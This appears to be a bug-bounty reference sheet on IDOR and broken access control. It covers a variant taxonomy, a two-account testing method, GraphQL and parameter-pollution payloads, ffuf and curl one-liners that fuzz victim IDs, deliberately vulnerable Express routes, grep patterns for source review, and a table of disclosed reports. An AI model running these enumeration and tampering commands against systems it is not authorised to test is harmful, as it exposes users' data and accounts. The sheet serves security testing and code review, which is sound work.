# IDOR & BROKEN ACCESS CONTROL — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (IDOR #1, Broken Auth #2), telegram-intel, github-x-intel (H1 reports, HolyTips, X tips), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Create TWO accounts (A=attacker, B=victim) — different privilege levels if possible
[ ] 2. Map ALL endpoints with object IDs (REST, GraphQL, WebSocket, API versions)
[ ] 3. Replay A's requests with B's IDs — test ALL HTTP methods
[ ] 4. Test sibling endpoints (admin/export, admin/delete, admin/reset)
[ ] 5. Test horizontal (same role) + vertical (different role) access
[ ] 6. Prove impact: read PII → Medium, write/modify → High, admin → Critical
```

---

## IDOR VARIANTS (Complete Taxonomy)

| Variant | Description | Example |
|---------|-------------|---------|
| **V1: Numeric ID Swap** | Sequential integer IDs | `/api/users/123/profile` → `124` |
| **V2: UUID Swap** | Enumerate via invite/export | `/api/reports/550e8400-e29b...` → victim's UUID |
| **V3: Indirect IDOR** | Parameter references other object | `POST /api/export?report_id=456` exports victim's report |
| **V4: Parameter Injection** | Add `user_id`/`account_id` param | `?user_id=victim` forces backend to use it |
| **V5: HTTP Method Swap** | PUT protected, DELETE not | `DELETE /api/users/123` works, `PUT` blocked |
| **V6: API Version Bypass** | Old version lacks auth | `/v1/users/123` works, `/v2/users/123` blocked |
| **V7: GraphQL Node** | Global ID via `node()` | `{ node(id: "base64(User:456)") { email } }` |
| **V8: WebSocket** | Client-supplied ID in WS message | `{"action":"get_history","userId":"victim-uuid"}` |
| **V9: Header-Based** | ID in custom header | `X-User-ID: victim-id` |
| **V10: Batch/Array** | Array of IDs in single request | `{"ids": [123, 124, 125]}` returns all |

---

## TESTING METHODOLOGY (Systematic)

### Phase 1: Endpoint Discovery
```bash
# 1. Crawl authenticated as User A
# 2. Capture ALL requests with object references
# 3. Extract ID patterns:
#    - URL paths: /api/orders/123, /users/uuid/profile
#    - Query params: ?order_id=123, ?user_id=456
#    - JSON body: {"order_id": 123}, {"userId": "uuid"}
#    - Headers: X-Account-ID, X-Organization-ID
#    - GraphQL: variables, node IDs
#    - WebSocket: message payloads
```

### Phase 2: Two-Account Testing
```bash
# Account A (attacker) - low privilege
# Account B (victim) - target

# For EACH endpoint with ID:
1. Login as A, perform action, capture request + response
2. Replace A's ID with B's ID in request
3. Send with A's auth token
4. Compare response:
   - 200 + B's data = IDOR (READ)
   - 200 + "success" + B's data modified = IDOR (WRITE)
   - 403/404 = Properly protected
   - Different error = Info disclosure (debug)

# Test ALL HTTP methods:
GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
```

### Phase 3: Advanced Variants
```bash
# GraphQL Node IDOR
query { node(id: "base64(User:VICTIM_ID)") { email, secretField } }

# GraphQL Mutation IDOR
mutation { updateProfile(input: {userId: "VICTIM_ID", email: "attacker@evil.com"}) { success } }

# API Version
# Check /v1/, /v2/, /api/v1/, /api/v2/, /mobile/, /legacy/

# HTTP Parameter Pollution
?user_id=attacker&user_id=victim
{"user_id": "attacker", "user_id": "victim"}

# Wildcard/Glob
/api/users/*, /api/users/%, /api/users/_

# Old/Deleted IDs
# Test IDs of deleted users, expired sessions
```

---

## BROKEN ACCESS CONTROL (BAC) — SIBLING RULE

### The Sibling Function Rule
> If 9 endpoints have auth middleware, the 10th that doesn't IS your bug.

```javascript
// PROTECTED
router.get('/admin/users', authenticate, authorize('admin'), getUsers);
router.get('/admin/stats', authenticate, authorize('admin'), getStats);
router.post('/admin/create', authenticate, authorize('admin'), createUser);

// VULNERABLE — Missing middleware
router.get('/admin/export', getExport);           // No auth!
router.delete('/admin/delete/:id', deleteUser);   // No auth!
router.post('/admin/reset-password', resetPwd);   // No auth!
router.get('/admin/debug', debugPanel);           // No auth!
```

### Testing Checklist
```
[ ] List ALL endpoints under each path prefix (/admin/, /api/admin/, /internal/)
[ ] Check EACH for auth middleware presence
[ ] Test authenticated as non-admin → should 403
[ ] Test unauthenticated → should 401/403
[ ] Test with different roles (user, manager, support, admin)
[ ] Check for client-side only checks (UI hides button, API open)
```

### Common BAC Patterns
```javascript
// 1. Client-side role check only
if (user.role === 'admin') showAdminButton();
// Backend: app.post('/api/admin/delete', deleteUser); // NO SERVER CHECK!

// 2. Feature flag without auth
if (config.enableNewFeature) router.get('/api/new-feature', handler);

// 3. Internal header trust
if (req.headers['x-internal-service']) return next(); // Trusts any internal header

// 4. Missing ownership check (IDOR + BAC combo)
app.get('/api/reports/:id', (req, res) => {
  // No check if report belongs to req.user
  return db.reports.find(req.params.id);
});

// 5. Role confusion (horizontal + vertical)
app.get('/api/users/:id/profile', (req, res) => {
  // User A can see User B's profile (horizontal)
  // User A can see Admin profile (vertical)
});
```

---

## GRAPHQL-SPECIFIC IDOR/BAC

### Over-Fetching (H1 #3000510 - $25k)
```graphql
# Regular user queries their own report
query { report(id: "123") { title, description } }

# But schema exposes sensitive fields
query { report(id: "123") { title, description, internalNotes, ssn, apiKey } }
```

### Introspection on Private Programs (H1 #1618347 - $25k)
```graphql
# __schema reveals hidden types
query { __schema { types { name, fields { name } } } }

# PolicyPageAssetGroup exposed in private programs
```

### IDOR via GraphQL Mutations (H1 #2633771)
```graphql
# deleteProfileInput accepts arbitrary user ID
mutation { deleteProfileInput(id: "VICTIM_ID") { success } }

# No ownership validation on mutation
```

### Batch Query Abuse
```graphql
# Single request extracts multiple users
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  # ... bypasses rate limits
}
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$35,000** | ATO via Password Reset without user interaction | GitLab | IDOR + Reset token reuse |
| **$25,000** | `/reports/:id.json` discloses sensitive user data | HackerOne | IDOR on reports endpoint |
| **$25,000** | Disclosing PolicyPageAssetGroup via GraphQL | HackerOne | GraphQL introspection |
| **$10,000** | Arbitrary Read of Another User's Private Repository | GitHub | AuthZ bypass |
| **$3,500** | Shopify Partners Invitation Privilege Escalation | Shopify | AuthZ bypass |
| **$550** | Access to business emails of Rockstar Support agents | Rockstar Games | IDOR on support tickets |
| **$500** | IDOR on ads.tiktok.com Allows Unauthorized Product Addition | TikTok | Horizontal IDOR |
| **—** | IDOR on in-app hardcoded zombie endpoint | Bykea | Hidden endpoint |
| **—** | IDOR in GraphQL deleteProfileInput | HackerOne | GraphQL mutation |
| **—** | Unauthorized Reservation Cancellation via IDOR | Yelp | Horizontal IDOR |
| **—** | Broken Access Control in TikTok Live Backstage | TikTok | Chained IDOR |
| **—** | IDOR - Scheduled data leak via projectID | SingleStore | Horizontal IDOR |

---

## CHAINS THAT PAY (Escalation Paths)

```
IDOR (Read PII)                              → Medium
IDOR (Write/Modify other's data)             → High
IDOR (Admin endpoint access)                 → Critical (PrivEsc)
IDOR + Account Takeover path                 → Critical
IDOR + Chatbot reads other user's data       → High
IDOR (GraphQL node) + sensitive fields       → High/Critical
BAC (Missing admin middleware) + data access → High/Critical
BAC (Client-side only check) + critical action → Critical
IDOR + SSRF (export → internal URL)          → Critical
IDOR + Password Reset token prediction       → Critical (ATO)
IDOR on WebSocket + real-time data           → High
Horizontal IDOR + Vertical PrivEsc           → Critical
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# ffuf IDOR fuzzing (numeric IDs)
ffuf -u "https://target.com/api/users/FUZZ/profile" -w <(seq 1 10000) -H "Authorization: Bearer TOKEN_A" -fc 403,404 -mc 200 -fs 0

# ffuf UUID fuzzing (from wordlist)
ffuf -u "https://target.com/api/reports/FUZZ" -w uuids.txt -H "Authorization: Bearer TOKEN_A" -fc 403,404

# GraphQL IDOR
# Extract all node IDs from introspection, then test each
# Tool: graphql-cop, graphw00f

# API Version testing
for v in v1 v2 v3 api/v1 api/v2 mobile legacy; do
  curl -H "Auth: TOKEN_A" "https://target.com/$v/users/VICTIM_ID" -w "$v: %{http_code}\n"
done

# HTTP Method testing
for method in GET POST PUT PATCH DELETE; do
  curl -X $method -H "Auth: TOKEN_A" "https://target.com/api/users/VICTIM_ID" -w "$method: %{http_code}\n"
done

# Parameter pollution
curl "https://target.com/api/profile?user_id=ATTACKER&user_id=VICTIM" -H "Auth: TOKEN_A"
curl -X POST "https://target.com/api/profile" -H "Auth: TOKEN_A" -d '{"user_id":["ATTACKER","VICTIM"]}'
```

---

## HOLYTIPS API SECURITY CHECKLIST (Applied to IDOR/BAC)

```
[ ] Version switching: /api/v3/users/123 → /api/v1/users/123
[ ] Verb tampering: GET /api/orders/1 → POST/PUT/DELETE
[ ] ID wrapping: {"id":111} → {"id":[111]} → {"id":{"id":111}}
[ ] HTTP Parameter Pollution: ?user_id=legit&user_id=victim
[ ] JSON Parameter Pollution: {"user_id":legit,"user_id":victim}
[ ] Wildcard IDs: /api/users/*, /api/users/%, /api/users/_
[ ] Numeric IDs vs UUID: /api/users/1 vs /api/users/uuid
[ ] Non-prod environments (staging/qa) — weaker auth
[ ] Content-Type switching: application/xml, text/plain
[ ] Unexpected JSON types: {"id":true}, {"id":null}, {"id":1}
[ ] Mobile API endpoints: /api/mobile/users/123
[ ] Developer/Debug endpoints: /api/dev/, /api/debug/, /api/test/
```

---

## CODE GREP PATTERNS (Source Review)

```bash
# Missing ownership check (Python/Flask/Django)
grep -rn "query.*get.*id" --include="*.py" | grep -v "current_user\|request.user\|owner\|user_id"

# Missing ownership check (Node/Express)
grep -rn "findById\|findOne.*id" --include="*.js" | grep -v "req.user\|userId\|owner"

# Missing auth middleware on sibling routes
grep -rn "router\.(get|post|put|delete|patch)" --include="*.js" | grep -v "authenticate\|authorize\|requireAuth"

# Client-side only role checks
grep -rn "user\.role.*===.*admin\|role.*==.*admin" --include="*.js" --include="*.tsx" --include="*.vue"

# GraphQL resolver without auth
grep -rn "resolve.*{" --include="*.js" --include="*.ts" | grep -v "context.user\|auth\|permission"

# WebSocket message handler without validation
grep -rn "onmessage\|on('message'" --include="*.js" | grep -v "validate\|verify\|check"

# Direct object reference in SQL
grep -rn "WHERE id = \|WHERE id=" --include="*.py" --include="*.js" --include="*.php" | grep -v "user_id\|owner_id\|account_id"
```

---

## TRIAGE DECISION TREE

```
1. Can attacker access object they don't own?
   NO → Not IDOR/BAC
   YES → Continue

2. What privilege level?
   - Same role (horizontal) → Continue
   - Higher role (vertical) → Higher severity

3. What impact?
   - Read PII (email, phone, address)           → Medium
   - Read secrets (API keys, tokens, passwords) → High
   - Write/Modify (change email, delete data)   → High
   - Admin functionality (user mgmt, config)    → Critical
   - Account Takeover path                      → Critical
   - Financial impact (orders, payments)        → Critical

4. Chain potential?
   + SSRF via export                             → Critical
   + Password reset token leak                   → Critical (ATO)
   + OAuth code theft via postMessage            → Critical
   + Chatbot data access                         → High
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| IDOR on public data (blog posts, public profiles) | No sensitivity = Info |
| IDOR requires 3+ preconditions (specific time, specific user state) | Theoretical = N/A |
| BAC on endpoint with NO sensitive functionality | Low/Info |
| "Could access if..." without demonstration | Theoretical = N/A |
| IDOR in dead code / deprecated API not in scope | Not reachable |
| Access to own data via different parameter | Not a bug |
| 403 but different error message | Info disclosure only |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `autorize` (Burp) | Auto-detect auth bypass |
| `authmatrix` (Burp) | Role-based access matrix |
| `ffuf` | ID fuzzing (numeric, UUID) |
| `graphql-cop` | GraphQL auth analysis |
| `graphw00f` | GraphQL fingerprinting |
| `nuclei` templates | IDOR/BAC templates |
| `swagger-codegen` | Generate clients from OpenAPI |
| `Postman`/`Insomnia` | Manual testing with env vars |
| Custom scripts | Two-account diffing |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Sections 1 (IDOR), 2 (Broken Auth), 28 (GraphQL)
- telegram-intel: @bugbountyusa tips #79, #83, #87; @bugbountyresources IDOR.pdf
- github-x-intel: H1 reports (GitLab $35k, H1 $25k×2, GitHub $10k, Shopify, TikTok, Bykea, Yelp, SingleStore); HolyTips API checklist; @Behi_Sec IDOR→$5k ATO
- bountyforge: ATO chains (9 paths), IDOR as #1 paid class
- bb-methodology: Multi-Perspective (horizontal/vertical), Tactical Thinking (naming anomaly)
- PortSwigger: IDOR lab, Access Control lab
- HackTricks: IDOR methodology